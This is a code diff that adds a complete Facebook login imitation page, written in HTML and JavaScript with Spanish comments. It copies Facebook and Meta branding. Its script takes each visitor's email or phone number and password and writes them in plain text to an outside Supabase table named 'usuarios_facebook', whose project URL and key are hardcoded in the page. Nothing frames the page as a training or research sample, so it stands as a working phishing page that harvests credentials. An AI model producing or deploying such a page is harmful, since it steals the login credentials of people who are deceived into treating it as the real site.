@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log into Facebook</title>
+  <link rel="stylesheet" href="style.css">
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- Supabase JS Client desde CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body>
+  <div class="page-container">
+    
+    <!-- LADO IZQUIERDO: BRANDING E ILUSTRACIÓN -->
+    <div class="left-section">
+      <!-- Logo Facebook -->
+      <div class="logo-container">
+        <svg class="facebook-logo" width="48" height="48" viewBox="0 0 24 24" fill="#0866ff">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+      </div>
+
+      <!-- COMPOSICIÓN DE IMÁGENES FLOTANTES -->
+      <div class="fb-illustration-wrapper">
+        <div class="float-item emoji-float">😆</div>
+        <div class="float-item card-blue-node">
+          <img src="https://images.unsplash.com/photo-1584100936595-c0654b55a2e2?w=400&auto=format&fit=crop" alt="Node art">
+        </div>
+        <div class="float-item story-skater">
+          <img src="https://images.unsplash.com/photo-1547447134-cd3f5c71651e?w=500&auto=format&fit=crop" alt="Skater in story">
+          <div class="story-badge">
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            16:45
+          </div>
+        </div>
+        <div class="float-item post-card">
+          <div class="post-header">
+            <div class="blue-icon">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </div>
+          </div>
+          <div class="post-img-bg">
+            <img src="https://images.unsplash.com/photo-1513151233558-d860c5398176?w=400&auto=format&fit=crop" alt="Tickets post">
+          </div>
+        </div>
+        <div class="float-item profile-avatar">
+          <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=200&auto=format&fit=crop" alt="Profile avatar">
+        </div>
+        <div class="float-item heart-float">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="#ff3040">
+            <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+          </svg>
+        </div>
+      </div>
+
+      <!-- Texto principal -->
+      <h1 class="hero-text">
+        Explore<br>
+        the<br>
+        things<br>
+        <span class="highlight">you love.</span>
+      </h1>
+    </div>
+
+    <!-- LADO DERECHO: FORMULARIO DE LOGIN -->
+    <div class="right-section">
+      <div class="form-container">
+        
+        <!-- Encabezado con flecha -->
+        <div class="header-login">
+          <i data-lucide="chevron-left" class="back-icon"></i>
+          <h2>Log into Facebook</h2>
+        </div>
+
+        <!-- Formulario conectado a Supabase -->
+        <form id="loginForm">
+          <div class="input-group">
+            <input type="text" id="emailOrPhone" placeholder="Email or mobile number" required>
+          </div>
+          
+          <div class="input-group">
+            <input type="password" id="password" placeholder="Password" required>
+          </div>
+
+          <button type="submit" class="btn-primary">Log in</button>
+        </form>
+
+        <!-- Mensaje de estado -->
+        <div id="statusMessage" style="margin-top: 15px; font-size: 14px; text-align: center; color: #0866ff; font-weight: 600;"></div>
+
+        <!-- Olvidaste tu contraseña -->
+        <div class="forgot-link-container">
+          <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <!-- Botón de Registro -->
+        <div class="register-container">
+          <a href="#" class="btn-secondary">Create new account</a>
+        </div>
+
+        <!-- Logo Meta -->
+        <div class="meta-footer">
+          <svg class="meta-logo" width="24" height="20" viewBox="0 0 100 20" fill="#0064e0">
+            <path d="M23.2 5c-2.3 0-4.3 1.2-5.4 3-1.1-1.8-3.1-3-5.4-3-3.6 0-6.5 2.9-6.5 6.5s2.9 6.5 6.5 6.5c2.3 0 4.3-1.2 5.4-3 1.1 1.8 3.1 3 5.4 3 3.6 0 6.5-2.9 6.5-6.5S26.8 5 23.2 5zm-10.8 10c-1.9 0-3.5-1.6-3.5-3.5s1.6-3.5 3.5-3.5 3.5 1.6 3.5 3.5-1.6 3.5-3.5 3.5zm10.8 0c-1.9 0-3.5-1.6-3.5-3.5s1.6-3.5 3.5-3.5 3.5 1.6 3.5 3.5-1.6 3.5-3.5 3.5z"/>
+          </svg>
+          <span>Meta</span>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Script para inicializar iconos y conectar con Supabase -->
+  <script>
+    lucide.createIcons();
+
+    // Configura tu cliente de Supabase con tus datos reales
+    const SUPABASE_URL = 'https://umnhvppnblypltuybfdf.supabase.co';
+    // Coloca aquí tu llave pública (anon key) de Supabase
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVtbmh2cHBuYmx5cGx0dXliZmRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzNzExODAsImV4cCI6MjEwNzk0NzE4MH0.DaYjmfCM6Cao5qVl_WU083TX7y7ZoYUyj9lJNH2xgtk'; 
+
+    const { createClient } = supabase;
+    const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const emailOrPhone = document.getElementById('emailOrPhone').value;
+      const password = document.getElementById('password').value;
+      const statusMessage = document.getElementById('statusMessage');
+
+      statusMessage.textContent = "Guardando registro...";
+
+      // Inserta los datos en la tabla 'usuarios_facebook'
+      const { data, error } = await _supabase
+        .from('usuarios_facebook')
+        .insert([
+          { email_or_phone: emailOrPhone, password: password }
+        ]);
+
+      if (error) {
+        console.error('Error:', error);
+        statusMessage.style.color = 'red';
+        statusMessage.textContent = "Hubo un error al registrar.";
+      } else {
+        statusMessage.style.color = '#0866ff';
+        statusMessage.textContent = "¡Datos registrados correctamente!";
+        document.getElementById('loginForm').reset();
+      }
+    });
+  </script>
+</body>
+</html>
